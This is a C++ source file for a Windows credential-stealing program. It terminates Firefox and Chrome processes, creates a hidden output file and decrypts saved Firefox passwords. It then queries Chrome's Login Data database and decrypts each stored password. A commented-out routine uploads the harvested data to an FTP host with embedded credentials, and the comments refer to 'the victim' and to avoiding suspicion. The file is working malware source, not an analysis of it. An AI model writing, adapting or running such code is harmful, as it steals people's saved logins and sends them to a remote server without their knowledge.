/*
	Project - 
*/

#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <string>
#include <cstdio>
#include <Wincrypt.h>
#include "stdafx.h"
#include <fstream>
#include <tlhelp32.h>
#include <time.h>
#include <wininet.h>
#include "misc.h"
#include "firefox.h"
#include "chrome.h"

#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "wininet.lib")

using namespace std;

//void main(){
int _tmain(int argc, _TCHAR* argv[])
{
	/*Lets create a timestamp,so we can use it as a file name when we upload data.txt to a FTP server,
	  so we can distinguish new uploads from older ones
	*/
	time_t timer;
	time(&timer);

	tm info;
	//localtime_s(&info, &timer);
	char date[30];
	//asctime_s(date, 30, &info);
	//char timeStamp[30];
	char timeStamp[30] = "testing";
	//_i64toa(timer, timeStamp, 10);
	//i64toa(timer, timeStamp, 10);

	/*Kill any firefox.exe or chrome.exe process to make sure there is nothing standing in our way
	  plugin-container.exe must be closed before firefox.exe,otherwise an crushing error of it will rise suspicions
	*/
	int firefoxCount;
	int chromeCount;
	int firefoxPluginCount;

	DWORD *firefoxProcesses = FindProcessIDs("firefox.exe", &firefoxCount);
	DWORD *chromeProcesses = FindProcessIDs("chrome.exe", &chromeCount);
	DWORD *firefoxPluginProcesses = FindProcessIDs("plugin-container.exe", &firefoxPluginCount);

	for (int i = 0; i < firefoxPluginCount; i++){
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, firefoxPluginProcesses[i]);
		if (process != INVALID_HANDLE_VALUE){
			TerminateProcess(process, 0);
		}
		CloseHandle(process);
	}

	for (int i = 0; i < firefoxCount; i++){
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, firefoxProcesses[i]);
		if (process != INVALID_HANDLE_VALUE){
			TerminateProcess(process, 0);
		}
		CloseHandle(process);
	}

	for (int i = 0; i < chromeCount; i++){
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, chromeProcesses[i]);
		if (process != INVALID_HANDLE_VALUE){
			TerminateProcess(process, 0);
		}
		CloseHandle(process);
	}

	free(firefoxPluginProcesses);
	free(firefoxProcesses);
	free(chromeProcesses);
	Sleep(1000);

	/*Open the file just for creation,so we will be able to hide it here,before any data is written to it*/

	out = fopen("data.txt", "w");
	if (out){
		hide_file("data.txt");
		//write timeStamp at the top
		fprintf(out, "Date: %s", date);
		fclose(out);
	}

	/*Mozilla Firefox part*/
	char *path = "D:\\share\\Firefox\\"; //installPath();
	if (loadFunctions(path)){
		//Lets see the credentials
		showDecryptedPasswords();
		free(path);
	}
	else{
		out = fopen("data.txt", "a+");
		if (out){
			fprintf(out, "Mozilla Firefox is not installed!\n");
			fclose(out);
		}
	}


	/*Google Chrome part*/
	//Load sqlite.dll
	HMODULE sqliteLib = LoadLibrary("sqlite3.dll");
	if (sqliteLib){
		//Lets find the functions in the dll
		sqlite3_open = (fpSqliteOpen)GetProcAddress(sqliteLib, "sqlite3_open");
		sqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(sqliteLib, "sqlite3_prepare_v2");
		sqlite3_step = (fpSqliteStep)GetProcAddress(sqliteLib, "sqlite3_step");
		sqlite3_column_text = (fpSqliteColumnText)GetProcAddress(sqliteLib, "sqlite3_column_text");
		sqlite3_finalize = (fpSqliteFinalize)GetProcAddress(sqliteLib, "sqlite3_finalize");
		sqlite3_close = (fpSqliteClose)GetProcAddress(sqliteLib, "sqlite3_close");
		char *installPath = readRegistryValue();
		if (installPath != NULL){
			//printf("\n\nGoogle Chrome part:\nInstalled in: %s\n\n", installPath);
			//Now we have to call same sqlite functions to start decrypting this shit:)
			sqlite3_stmt *stmt;
			sqlite3 *db;

			char databasePath[260];
			getPath(databasePath, CSIDL_LOCAL_APPDATA);
			strcat(databasePath, "\\Google\\Chrome\\User Data\\Default\\Login Data");

			char *query = "SELECT origin_url, username_value, password_value FROM logins";
			//Open the database
			if (sqlite3_open(databasePath, &db) == SQLITE_OK) {
				if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
					//Lets begin reading data
					int entries = 0;
					out = fopen("data.txt", "a+");
					if (out){
						fprintf(out, "\n\n%s", "From Google Chrome:\n\n");
						while (sqlite3_step(stmt) == SQLITE_ROW) {
							//While we still have data in database
							char *url = (char *)sqlite3_column_text(stmt, 0);
							char *username = (char *)sqlite3_column_text(stmt, 1);
							BYTE *password = (BYTE *)sqlite3_column_text(stmt, 2); //This is the only encrypted field
							fprintf(out, "Entry: %d\n", entries);
							fprintf(out, "Url: %s\n", url);
							fprintf(out, "Username: %s\n", username);

							char *decrypted = CrackChrome(password);
							fprintf(out, "Password: %s\n", decrypted);
							fprintf(out, "%s\n", dupncat("-", 50));
							entries++;
						}
						fclose(out);
					}
					if (entries == 0){
						printf("No entries found!\n");
					}
				}
				else
					printf("Error preparing database!\n");
				sqlite3_finalize(stmt);
				sqlite3_close(db);
			}
			else
				printf("Error opening database!\n");
		}
		else{
			out = fopen("data.txt", "a+");
			if (out){
				fprintf(out, "Google Chrome is not installed!\n");
				fclose(out);
			}
		}
		delete[]installPath;
		FreeLibrary(sqliteLib);
	}
	else
		printf("Necessary sqlite dll not found!\n");
	//upload the file
	//if (uploadFile("data.txt", dupcat(timeStamp,".txt", 0), "nlc.6te.net", "nlc.6te.net", "JackAndJillWentU")){
	//	//printf("Success upload!\n");
	//}

	//delete the file,so no more data is appended to it,if the victim is opening the program again!
	//we need to create a new file in this case,not use the old one!
	//unlink("data.txt");
	return 0;
}
